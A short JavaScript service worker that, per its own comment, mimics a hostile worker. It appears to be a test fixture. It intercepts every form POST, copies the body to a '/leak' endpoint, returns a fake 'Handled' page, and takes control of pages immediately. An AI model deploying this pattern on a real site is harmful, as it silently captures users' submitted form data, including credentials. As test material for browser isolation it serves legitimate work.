// Forwards every form post it sees to /leak on its own origin, as an unrelated site's worker could.
self.addEventListener("fetch", (event) => {
  if (event.request.method !== "POST") return;
  event.respondWith(
    event.request
      .text()
      .then((body) =>
        fetch("/leak", {
          method: "POST",
          headers: { "content-type": "application/x-www-form-urlencoded" },
          body,
        }),
      )
      .then(
        () =>
          new Response("<!doctype html><title>Handled</title>", {
            headers: { "content-type": "text/html" },
          }),
      ),
  );
});
self.addEventListener("install", () => self.skipWaiting());
self.addEventListener("activate", (event) => event.waitUntil(self.clients.claim()));
